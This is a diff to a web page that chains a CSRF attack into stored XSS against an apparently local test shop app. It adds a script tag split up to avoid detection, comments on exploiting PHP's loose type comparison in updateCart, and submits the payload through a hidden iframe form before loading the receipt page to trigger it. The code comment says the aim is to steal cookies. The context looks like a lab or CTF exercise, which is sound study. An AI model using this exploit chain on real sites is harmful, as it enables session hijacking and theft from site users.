@@ -6,6 +6,13 @@
         iframe.name = "myTarget";
         iframe.style.display = "none";
 
+        /*
+            In this script you steal the cookies somehow.
+            The one prepending the script is necessary to pass the check in updateCart
+            since in PHP you can compare strings with ints.
+        */
+        let dangerousJS = "1<scri"+"pt>alert(document.cookie);</scr"+"ipt>";
+
         function csrf(url, data={}) {
             let form = document.createElement("form");
             let node = document.createElement("input");
@@ -30,7 +37,11 @@
 
         window.addEventListener("load", function () {
             document.body.appendChild(iframe);
-            csrf("http://localhost:8080/updateCart.php", {'action': "add", 'product': "2", 'quantity': "1337"});
+            iframe.onload = function (event){
+                csrf("http://localhost:8080/receipt.php");
+                iframe.onload = function (){};
+            };
+            csrf("http://localhost:8080/updateCart.php", {'action': "set", 'product': 1, 'quantity': dangerousJS});
         });
         </script>
     </body>
